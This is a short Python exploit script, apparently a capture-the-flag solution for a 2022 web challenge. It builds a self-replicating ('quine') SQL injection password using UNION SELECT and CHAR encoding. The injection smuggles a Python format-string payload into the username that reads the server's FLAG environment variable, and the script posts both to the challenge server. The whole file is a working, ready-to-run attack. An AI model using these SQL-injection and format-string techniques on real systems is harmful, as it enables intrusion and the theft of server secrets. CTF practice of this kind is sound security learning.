import requests

def repr_quine(data):
    data = data.replace('$$', "REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())")
    blob = data.replace("'", '"').replace('$$', "'$'")
    data = data.replace('$$', f'"{blob}"')
    return data


def exploit():
    # Set the username to leak FLAG via the format string bug
    envleak = "{post.__init__.__globals__[os].environ[FLAG]}"
    username = envleak + "\"'"

    # Set the password to do a quine-y injection of the above
    # username alongside itself
    password = f" UNION SELECT CHAR({','.join(str(ord(c)) for c in username)}), $$;-- -"
    print(password)
    password = repr_quine(password)

    # Send to the challenge server
    r = requests.post(url="https://web-sqli2022-85d13aec009e.2022.ductf.dev/",
                      data={
                          "username": username,
                          "password": password
                      })

    # Flag get
    print(r.text)


if __name__ == "__main__":
    exploit()